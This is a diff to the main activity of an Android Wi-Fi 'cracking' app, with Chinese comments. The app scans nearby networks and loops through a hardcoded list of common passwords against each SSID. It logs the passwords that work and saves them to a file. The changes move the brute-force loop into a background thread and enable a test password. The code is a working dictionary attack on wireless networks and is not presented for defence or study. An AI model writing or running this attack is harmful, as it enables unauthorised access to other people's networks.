@@ -10,6 +10,7 @@ import android.content.pm.PackageManager;
 import android.net.wifi.ScanResult;
 import android.net.wifi.SupplicantState;
 import android.net.wifi.WifiConfiguration;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Environment;
@@ -43,14 +44,14 @@ public class MainActivity extends AppCompatActivity {
     private boolean mHasPermission;
     String TAG = "MainActivity";
     private WifiManager.WifiLock wifiLock;
+    private int mConnectCount;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        registerBroadcastReceiver();
-
+        mWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
+        mMainHandler = new Handler();
         // 创建wifi锁 -- 主要作用于息屏后使wifi一直连接 (由于电池管理为省电会息屏2分钟后关闭wifi)
         wifiLock = mWifiManager.createWifiLock("wifiLock");
         if (wifiLock != null) {
@@ -58,17 +59,17 @@ public class MainActivity extends AppCompatActivity {
             wifiLock.acquire();
         }
 
-        mWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
-        mMainHandler = new Handler();
+        findChildViews();   //findviewbyid
 
-        findChildViews();
+        configChildViews(); //View的点击事件及系列视图
 
-        configChildViews();
-
-        mHasPermission = checkPermission();
+        mHasPermission = checkPermission(); //申请权限
         if (!mHasPermission) {
             requestPermission();
         }
+        //我的手机测试过,好像这个广播不怎么有用处,可能需要运气才能反应密码错误,
+        // 我设置2s后自动下个密码连接,基本这个广播没用(不知道是不是厂商屏蔽了,防止wifi密码破解)
+//        registerBroadcastReceiver();    //注册广播,监听wifi连接时是否密码错误(实际效果并不怎么好用)
     }
 
     Button mOpenWifiButton;
@@ -110,7 +111,7 @@ public class MainActivity extends AppCompatActivity {
             "88886666",
             "11223344",
             "147258369", //  手机wifi常用设置密码
-//            "Toppine123",   //测试
+            "Toppine123",   //测试
             "11111111",
             "11110000",
             "22222222",
@@ -122,11 +123,12 @@ public class MainActivity extends AppCompatActivity {
             "99999999",
             "86868686"
     };
-    public static int sleep_time = 100;    //最好不要超过5秒,有可能运行在main线程,主线程下超过5s会报无响应错误
+    public static int sleep_time = 100;    //sleep_time*sleep_time_count最好不要超过5秒,有可能运行在main线程,主线程下超过5s会报无响应错误
     public int sleep_time_count = 0;    //用来计数睡眠次数的,如果睡眠超过了20次用来终止睡眠(用了2s时间)
-    private List<ScanResult> mScanResultList;
+    public List<ScanResult> mScanResultList;
     public boolean wifi_connecting = false;
     public static boolean is_password_error = false;
+
     private void configChildViews() {
         findViewById(R.id.pojie).setOnClickListener(new View.OnClickListener() {
             @Override
@@ -149,7 +151,8 @@ public class MainActivity extends AppCompatActivity {
                         @Override
                         public void run() {
                             wifi_connecting = true;
-                            for (ScanResult scanResult : mScanResultList) {
+                            List<ScanResult> mscanResultList = mScanResultList;
+                            for (ScanResult scanResult : mscanResultList) {
                                 for (int i = 0; i < usePassword.length; i++) {
                                     if (mWifiManager.getConnectionInfo().getSupplicantState() != SupplicantState.COMPLETED) {
                                         is_password_error = false;
@@ -157,9 +160,9 @@ public class MainActivity extends AppCompatActivity {
                                         linkWifi(scanResult.SSID, usePassword[i]);
                                     } else if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED
                                             || WiFiUtil.getInstance(getApplicationContext()).isConnected(getApplicationContext())) {
-                                        Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i]);
+                                        Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i - 1]);
                                         if (i == 0) {
-                                            writePasswordToFile((mScanResultList.get((mScanResultList.indexOf(scanResult) - 1))).SSID, usePassword[usePassword.length - 1]);
+                                            writePasswordToFile((mscanResultList.get((mscanResultList.indexOf(scanResult) - 1))).SSID, usePassword[usePassword.length - 1]);
                                         } else {
                                             writePasswordToFile(scanResult.SSID, usePassword[i - 1]);
                                         }
@@ -170,7 +173,8 @@ public class MainActivity extends AppCompatActivity {
                                     while (!is_password_error) {
                                         SystemClock.sleep(sleep_time);
                                         sleep_time_count++;
-                                        if (sleep_time_count>=20) {
+                                        if (sleep_time_count >= 20) {
+                                            Log.e(TAG, "sleep_time_count:" + sleep_time_count);
                                             is_password_error = true;//如果连接了2s没连上,认为密码错误
                                         }
                                     }
@@ -201,6 +205,7 @@ public class MainActivity extends AppCompatActivity {
             public void onClick(View v) {
                 if (mWifiManager.isWifiEnabled()) {
                     //Todo 没有mWifiManager.startScan()就可以直接getScanResults,我试过好像23版本以下就不行了
+                    mWifiManager.startScan();
                     mScanResultList = mWifiManager.getScanResults();
                     sortList(mScanResultList);
                     Log.e("wifi_array_size", mScanResultList.size() + "数组");
@@ -293,39 +298,49 @@ public class MainActivity extends AppCompatActivity {
             mView.setOnClickListener(new View.OnClickListener() {
                 @Override
                 public void onClick(View v) {
+                    if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED) {
+                        Toast.makeText(MainActivity.this, "wifi已经连接了,不再连接了", Toast.LENGTH_LONG).show();
+                        return;
+                    }
                     if (wifi_connecting) {
                         return;
                     } else {
-                        wifi_connecting = true;
-                        // 连接wifi密码  createWifiConfig(wifi名,密码,加密类型)(加密一般类型主要是WPA)
-                        for (int i = 0; i < usePassword.length; i++) {
-                            //表明已经wifi连接经过了四次握手并没有连接成功
-                            if (mWifiManager.getConnectionInfo().getSupplicantState() != SupplicantState.COMPLETED
-                                    || mWifiManager.getWifiState() != WifiManager.WIFI_STATE_ENABLED) {
-                                is_password_error = false;
-                                sleep_time_count = 0;
-                                linkWifi(scanResult.SSID, usePassword[i]);
-                            } else if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED
-                                    || WiFiUtil.isConnected(getApplicationContext())) {
-                                Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i]);
-                                if (i == 0) {
-                                    writePasswordToFile(scanResult.SSID, usePassword[usePassword.length - 1]);
-                                } else {
-                                    writePasswordToFile(scanResult.SSID, usePassword[i - 1]);
+                        new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                wifi_connecting = true;
+                                // 连接wifi密码  createWifiConfig(wifi名,密码,加密类型)(加密一般类型主要是WPA)
+                                for (int i = 0; i < usePassword.length; i++) {
+                                    //表明已经wifi连接经过了四次握手并没有连接成功
+                                    if (mWifiManager.getConnectionInfo().getSupplicantState() != SupplicantState.COMPLETED
+                                            || mWifiManager.getWifiState() != WifiManager.WIFI_STATE_ENABLED) {
+                                        is_password_error = false;
+                                        sleep_time_count = 0;
+                                        linkWifi(scanResult.SSID, usePassword[i]);
+                                    } else if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED
+                                            || WiFiUtil.isConnected(getApplicationContext())) {
+                                        Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i - 1]);
+                                        if (i == 0) {
+                                            writePasswordToFile(scanResult.SSID, usePassword[usePassword.length - 1]);
+                                        } else {
+                                            writePasswordToFile(scanResult.SSID, usePassword[i - 1]);
+                                        }
+                                        wifi_connecting = false;
+                                        return;
+                                    }
+                                    while (!is_password_error) {
+                                        SystemClock.sleep(sleep_time);
+                                        sleep_time_count++;
+                                        if (sleep_time_count >= 20) {
+                                            is_password_error = true;//如果连接了2s没连上,认为密码错误
+                                            Log.e(TAG, "sleep_time_count:" + sleep_time_count);
+                                        }
+                                    }
                                 }
+                                alert();
                                 wifi_connecting = false;
-                                return;
                             }
-                            while (!is_password_error) {
-                                SystemClock.sleep(sleep_time);
-                                sleep_time_count++;
-                                if (sleep_time_count>=20) {
-                                    is_password_error = true;//如果连接了2s没连上,认为密码错误
-                                }
-                            }
-                        }
-                        alert();
-                        wifi_connecting = false;
+                        }).start();
                     }
                 }
             });
@@ -497,20 +512,74 @@ public class MainActivity extends AppCompatActivity {
     private BroadcastReceiver mBroadcastReceiver;
 
     private void registerBroadcastReceiver() {
-        mBroadcastReceiver = new BroadcastReceiver() {
+        mBroadcastReceiver = new BroadcastReceiver() {  //发现不仅不能有作用,本来能连接的wifi经过这个还不能连接
             @Override
             public void onReceive(Context context, Intent intent) {
+                if (intent.getAction().equals(WifiManager.WIFI_STATE_CHANGED_ACTION)) {
+                    int message = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, -1);
+                    switch (message) {
+                        case WifiManager.WIFI_STATE_DISABLED:
+                            //Toast.makeText(getApplicationContext(), "不可用", Toast.LENGTH_SHORT).show();
+                            break;
+                        case WifiManager.WIFI_STATE_DISABLING:
+                            //Toast.makeText(getApplicationContext(), "正在关闭或者断开", Toast.LENGTH_SHORT).show();
+                            break;
+                        case WifiManager.WIFI_STATE_ENABLED:
+                            //Toast.makeText(getApplicationContext(), "可用", Toast.LENGTH_SHORT).show();
+                            break;
+                        case WifiManager.WIFI_STATE_ENABLING:
+                            //Toast.makeText(getApplicationContext(), "正在打开或者连接", Toast.LENGTH_SHORT).show();
+                            break;
+                        case WifiManager.WIFI_STATE_UNKNOWN:
+                            //Toast.makeText(getApplicationContext(), "未知", Toast.LENGTH_SHORT).show();
+                            break;
+                        default:
+                            break;
+                    }
+                } else if (intent.getAction().equals(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)) {
+//                    WifiInfo wifiInfo = mWifiManager.getWifiInfo();
+                    WifiInfo wifiInfo = mWifiManager.getConnectionInfo();
+                    SupplicantState state = wifiInfo.getSupplicantState();
+                    String str = "未知";
+                    if (state == SupplicantState.SCANNING) {
+                        str = "正在扫描";
+                    }
+                    if (state == SupplicantState.ASSOCIATED) {
+                        str = "关联AP成功";
+                    } else if (state.toString().equals("AUTHENTICATING")) {
+                        str = "正在验证";
+                    } else if (state == SupplicantState.ASSOCIATING) {
+                        str = "正在关联AP...";
+                    } else if (state == SupplicantState.COMPLETED) {
+                        str = "连接成功";
+                    } else if (state == SupplicantState.INACTIVE) {
+
+                    } else if (state.toString().equals("DISCONNECTED")) {   //有时并不能及时反应出来,有时正确密码连接时会走这里
+                        str = "连接不成功";
+                        Log.e(TAG, "mConnectCount: " + mConnectCount);
+                        if (mConnectCount < 1)
+                            mConnectCount++;
+                        else {
+                            is_password_error = true;
+                            mConnectCount = 0;
+//                            Toast.makeText(getApplicationContext(), "密码错误", Toast.LENGTH_SHORT).show();
+                        }
+                    }
+                    //Toast.makeText(getApplicationContext(),str, Toast.LENGTH_SHORT).show();
+                    Log.e(TAG, "连接状态: "+str+ "连接WiFi名:"+intent.getStringExtra(WifiManager.EXTRA_BSSID));
+                }
                 int linkWifiResult = intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, 123);
+                Log.e(TAG, "wifi_link_error" + linkWifiResult);    //大多数返回123
                 if (linkWifiResult == WifiManager.ERROR_AUTHENTICATING) {
-                    is_password_error = true;   //监听到连接wifi密码错误,改变flag
+                    is_password_error = true;   //监听到连接wifi验证错误,改变flag
                 }
             }
         };
 
         IntentFilter intentFilter = new IntentFilter();
-//        intentFilter.addAction("android.net.wifi.WIFI_AP_STATE_CHANGED");
+        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);   //监听网络状态改变
         intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
-        this.registerReceiver(mBroadcastReceiver, intentFilter);
+        registerReceiver(mBroadcastReceiver, intentFilter);
     }
 
     private void unregisterBroadcastReceiver() {
